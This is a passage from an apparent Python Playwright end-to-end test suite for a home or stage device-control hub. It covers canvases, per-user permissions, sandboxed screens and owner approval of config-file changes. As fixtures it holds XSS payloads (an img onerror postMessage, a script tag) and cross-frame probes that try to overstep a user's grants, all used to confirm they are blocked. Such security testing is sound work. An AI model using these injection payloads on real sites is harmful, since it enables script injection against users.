        with open(os.path.join(canvas_dir, "broken.json"), "w") as f:
            json.dump({"kind": "canvas", "name": "Half written", "pages": [{"name": "One", "pieces": [{"type": "slider", "at": [1, 1], "key": "level"}]}]}, f)
        with open(os.path.join(canvas_dir, "words.json"), "w") as f:
            json.dump({"kind": "canvas", "name": "<img src=x onerror=parent.postMessage({type:'set'},'*')>", "pages": [{"name": "<b>One</b>", "pieces": [{"type": "label", "at": [1, 1, 4, 1], "text": "<script>document.title='run'</script><img src=x>"}, {"type": "label", "at": [1, 2, 4, 1], "text": "second"}]}]}, f)
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#pick option").nth(4).wait_for(state="attached", timeout=8000)
        names = await cv.locator("#pick option").all_inner_texts()
        check("canvases written as files are there beside the one made on the page", names == ["<img src=x onerror=parent.postMessage({type:'set'},'*')>", "Half written", "Run sheet", "Stage lamp", "Switcher"], str(names))
        await cv.locator("#pick").select_option("words"); await cv.locator("#board .label").first.wait_for()
        check("every word of a canvas is shown as words and never run", await cv.locator("#board img, #board script, #pick img").count() == 0 and "<script>" in await cv.locator("#board .label").first.inner_text() and await next(f for f in owner.frames if "/screens/canvas/" in f.url).title() == "Skillfully: canvas")
        await cv.locator("#pick").select_option("broken"); await cv.locator("#blank li").first.wait_for()
        told = await cv.locator("#blank").inner_text()
        check("a canvas that cannot be drawn says which file and what is wrong with it", "This canvas cannot be drawn" in told and "broken.json" in told and "Page 1, piece 1 (slider)" in told and "needs a key such as" in told, told)
        await cv.locator("#pick").select_option("switcher"); await cv.locator("#board button.piece", has_text="Outlet 3").wait_for(timeout=8000)
        lamp_on = cv.locator("#board button.piece", has_text="Lamp on")
        check("a button is lit by a reading of its device", "lit" in await lamp_on.get_attribute("class") and "lit" not in await cv.locator("#board button.piece", has_text="Lamp off").get_attribute("class"), await lamp_on.get_attribute("class"))
        three = cv.locator("#board button.piece", has_text="Outlet 3")
        was = "lit" in await three.get_attribute("class")
        await three.click()
        await cv.locator("#board button.piece.lit", has_text="Outlet 3").wait_for(timeout=5000)
        check("a repeated row of buttons: the one pressed turns the outlet on and lights up", not was and (await state("sim-switch"))["switch/outlet/3/on"] is True)
        if shots: await owner.screenshot(path=f"{shots}/10b-canvas-switcher.png")
        await cv.locator("#pick").select_option("run-sheet"); await cv.locator("#board .clock .num").wait_for()
        check("one canvas holds pieces of several devices, and a clock", re.match(r"^\d{1,2}:\d\d:\d\d", await cv.locator("#board .clock .num").inner_text()) is not None and await cv.locator("#board .readout .num").inner_text() == "on" and await cv.locator("#board button.piece[aria-pressed]").count() == 2, await cv.locator("#board").inner_text())
        house = cv.locator("#board .slider", has_text="House lights")
        box = await house.locator(".track").bounding_box()
        await owner.mouse.move(box["x"] + box["width"] * .9, box["y"] + 4); await owner.mouse.down()
        await owner.mouse.move(box["x"] + box["width"] * .3, box["y"] + 4, steps=6); await owner.mouse.up()
        for _ in range(40):
            if abs((await state("sim-switch"))["switch/outlet/2/brightness"] - 30) <= 3: break
            await owner.wait_for_timeout(100)
        dim = (await state("sim-switch"))["switch/outlet/2/brightness"]
        check("a slider lying down sets the brightness it is dragged to", abs(dim - 30) <= 3 and await house.locator(".num").inner_text() == f"{round(dim)}%", f"{dim} {await house.locator('.num').inner_text()}")
        if shots: await owner.screenshot(path=f"{shots}/10c-canvas-run-sheet.png")
        # The owner adds the ear-mix canvas. Nobody has set the owner's own ears, and it says so.
        await cv.locator("#more").click()
        await cv.locator("#shelf .item", has_text="My ears").get_by_role("button", name="Add").click()
        await cv.locator("#board .slider").first.wait_for(timeout=8000)
        check("a piece that needs something nobody has set for you says so, and sends nothing", await cv.locator("#board .slider.off").count() == 8 and "Not set for you" in await cv.locator("#board .slider").first.inner_text(), await cv.locator("#board .slider").first.inner_text())

        # A canvas of nothing but words is for everyone, so the test's one is taken away again before Sam looks.
        os.remove(os.path.join(canvas_dir, "words.json"))
        # Sam is given the two abilities about Sam's own ears, on Canvas. The same canvas is now Sam's own mix.
        musician = next(r for r in everything["roles"] if r["name"] == "Musician")
        saved = await admin("/admin/api/role", {"role": {**musician, "grants": {**musician["grants"], "canvas": ["see-my-ears", "adjust-my-ears"]}}})
        check("a role can be given part of Canvas", saved.get("ok") is True, json.dumps(saved)[:200])
        # Sam was turned off earlier. The owner turns Sam back on, and Sam signs in again.
        await admin("/admin/api/person/disabled", {"id": sam_id, "disabled": False})
        await pg.goto(base + "/signin"); await pg.fill("#name", "Sam"); await pg.fill("#secret", SAM_PIN); await pg.click("#go")
        await pg.wait_for_url("**/s/one-fader")
        await pg.goto(base + "/s/canvas")
        sv = pg.frame_locator("#screen")
        await sv.locator("#board .slider").first.wait_for(timeout=10000)
        check("Sam is shown the one canvas with anything of Sam's on it, and no way to add or remove one", await sv.locator("#name").inner_text() == "My ears" and not await sv.locator("#pick").is_visible() and not await sv.locator("#more").is_visible(), await sv.locator("header").inner_text())
        strips = await sv.locator("#board .slider .name").all_inner_texts()
        check("each strip takes its name from the board", len(strips) == 8 and strips[1] == (await state("sim-console"))["console/input/2/name"], str(strips))
        two = sv.locator("#board .slider").nth(1)
        box = await two.locator(".track").bounding_box()
        await pg.mouse.move(box["x"] + 4, box["y"] + box["height"] * .5); await pg.mouse.down()
        await pg.mouse.move(box["x"] + 4, box["y"] + box["height"] * .2, steps=8); await pg.mouse.up()
        # The board ends up where the thumb was let go, and the strip shows what the board holds.
        words = lambda v: ("+" if v > 0 else "") + f"{v:.1f}"
        for _ in range(40):
            level = (await state("sim-console"))["console/input/2/bus/1/level"]
            if level > -90 and await two.locator(".num").inner_text() == words(level): break
            await pg.wait_for_timeout(100)
        check("dragging a strip moves that input in Sam's own bus on the board", -20 < level < 5 and await two.locator(".num").inner_text() == words(level), f"{level} {await two.locator('.num').inner_text()}")
        if shots: await pg.screenshot(path=f"{shots}/10d-canvas-sam.png")
        sf = next(f for f in pg.frames if "/screens/canvas/" in f.url)
        ack = await sf.evaluate(ASK, ["sim-console", "console/input/2/bus/5/level", 0])
        check("whatever a canvas has on it, Sam's reach stops at Sam's own bus", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        ack = await sf.evaluate(ASK, ["sim-switch", "switch/outlet/1/on", True])
        check("and Sam cannot flip a switch through Canvas", ack.get("ok") is False and (await state("sim-switch"))["switch/outlet/1/on"] is False, json.dumps(ack))
        kept = await sf.evaluate("""() => new Promise((res) => {
          addEventListener("message", (e) => { if (e.data.type === "doc-ack" && e.data.ref === "probe-doc") res(e.data); });
          parent.postMessage({ type: "doc-put", id: "my-ears", doc: { kind: "canvas", name: "Sam's", pages: [] }, ref: "probe-doc" }, "*");
          setTimeout(() => res({ timeout: true }), 1500);
        })""")
        check("or change a canvas", kept.get("ok") is False, json.dumps(kept))
        probes = await sf.evaluate(PROBES)
        check("Canvas is held to the same sandbox as every screen", all(v == "blocked" for k, v in probes.items() if k != "origin") and probes["origin"] == "null", json.dumps(probes))
        await pg.goto(base + "/s/one-fader")

        # --- Someone who can only write files proposes a change. The hub does what is safe, and asks about the rest ---
        await owner.goto(base + "/admin/hub"); await owner.wait_for_selector("#secConfig:not([hidden]) #configTrust")
        folder = re.search(r"in (.+)/devices\.", await owner.locator("#configWhere").inner_text()).group(1)
        check("a hub starts out strict about what files may do", "Strict." in await owner.locator("#configTrust").inner_text())
        path = os.path.join(folder, "devices", "sim-switch.json")
        with open(path) as f: device = json.load(f)
        check("the file says what the hub holds, and no more", device["control"] is True and device["name"] == "Simulated switch", str(device))
        device["control"] = False
        device["reach"]["allowed"] = device["reach"]["allowed"] + ["10.0.0.7:9000"]
        with open(path, "w") as f: json.dump(device, f)
        await owner.goto(base + "/admin")
        await owner.locator("#needs .need", has_text="Files in the config folder propose 2 changes. 1 needs your yes.").wait_for(timeout=20000)
        check("Home says the files propose something, and how much of it needs a yes", True)
        await owner.locator("#needs .need", has_text="config folder").locator("a.open").click()
        await owner.wait_for_selector("#configList .change")
        told = await owner.locator("#configList").inner_text()
        check("the Hub place says each change in words, and which one waits", "Stop people controlling Simulated switch" in told and "Let Simulated switch: Reach the device at 10.0.0.7, port 9000" in told and told.count("Waits for your yes") == 1 and told.count("Done when you apply") == 1, told)
        if shots: await owner.screenshot(path=f"{shots}/9-config-proposed.png", full_page=True)
        await owner.click("#configApply")
        asked = await owner.locator("#dlgBody").inner_text()
        check("applying shows what will be done, and it is only the change that hands out nothing", "Stop people controlling Simulated switch" in asked and "10.0.0.7" not in asked, asked)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => document.querySelectorAll('#configList .change').length === 1")
        drivers = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["drivers"]
        switch = next(d for d in drivers if d["id"] == "sim-switch")
        check("what was safe is done, and what hands out power is not", switch["mode"] == "listen" and not any("10.0.0.7" in g["words"] for g in switch["grants"]), str(switch["grants"]))
        await owner.locator("#configList .change").get_by_role("button", name="Say yes").click()
        check("saying yes shows exactly what is being said yes to", "Reach the device at 10.0.0.7, port 9000" in await owner.locator("#dlgBody").inner_text())
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.locator("#configList .status.ok", has_text="The files say the same as the hub.").wait_for(timeout=15000)
        drivers = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["drivers"]
        switch = next(d for d in drivers if d["id"] == "sim-switch")
        check("after the yes, the device holds it", any("10.0.0.7" in g["words"] for g in switch["grants"]), str(switch["grants"]))
        await owner.locator("#configTrust").get_by_role("button", name="Change").click()
        await owner.locator("#dlgBody label.check", has_text="Trusting for an hour").locator("input").check()
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.locator("#configTrust", has_text="Strict again in 60 minutes").wait_for(timeout=10000)
        check("trusting can be turned on for an hour, and the page says when it ends", "Trusting." in await owner.locator("#configTrust").inner_text())
        if shots: await owner.screenshot(path=f"{shots}/9b-config-trusting.png", full_page=True)

        check("no page errors", not unexpected, "; ".join(unexpected))
        await b.close()

asyncio.run(main())
print(f"\n{sum(results)} of {len(results)} checks passed")
sys.exit(0 if all(results) else 1)
